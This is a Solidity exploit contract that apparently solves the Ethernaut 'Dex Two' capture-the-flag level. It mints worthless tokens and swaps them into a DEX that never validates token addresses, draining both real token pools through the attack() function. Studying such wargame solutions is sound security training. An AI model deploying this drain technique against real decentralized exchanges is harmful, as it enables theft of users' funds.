// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';

interface IDex {
  function swap(address from, address to, uint amount) external;
  function getSwapPrice(address from, address to, uint amount) external view returns(uint);
  function approve(address spender, uint amount) external;
  function balanceOf(address token, address account) external view returns(uint);
  function token1() external view returns(address);
  function token2() external view returns(address);
}

contract TokenXX is ERC20 {
    constructor() ERC20("TokenXX", "XX") {
        _mint(msg.sender, 2);
    }
}

contract TokenXY is ERC20 {
    constructor() ERC20("TokenXY", "XY") {
        _mint(msg.sender, 2);
    }
}

contract DexTwoAttack {
    IDex public ethernautInstance;
    IERC20 public token1;
    IERC20 public token2;
    IERC20 public tokenXX;
    IERC20 public tokenXY;

    constructor(address instanceAddress, address _tokenXX, address _tokenXY) {
        ethernautInstance = IDex(instanceAddress);
        token1 = IERC20(ethernautInstance.token1());
        token2 = IERC20(ethernautInstance.token2());
        tokenXX = IERC20(_tokenXX);
        tokenXY = IERC20(_tokenXY);
    }

    // Before the attack, send 1 token XX and 1 token XY to the victim contract.
    // Because of this, getSwapAmount function will return 100 token1 for only 1 tokenXX
    function attack() public {
        // approve token usage for swap.
        tokenXX.approve(address(ethernautInstance), 1);
        tokenXY.approve(address(ethernautInstance), 1);

        // swap 1 tokenXX for token1 (1 token XX will be equal to 100 token1 according to calculation)
        ethernautInstance.swap(address(tokenXX), address(token1), 1);

        // swap 1 tokenXY for token2 (1 token XY will be equal to 100 token2 according to calculation)
        ethernautInstance.swap(address(tokenXY), address(token2), 1);
    }

    function sendBack() public {
      tokenXX.transfer(msg.sender, tokenXX.balanceOf(address(this)));
      tokenXY.transfer(msg.sender, tokenXY.balanceOf(address(this)));
    }
}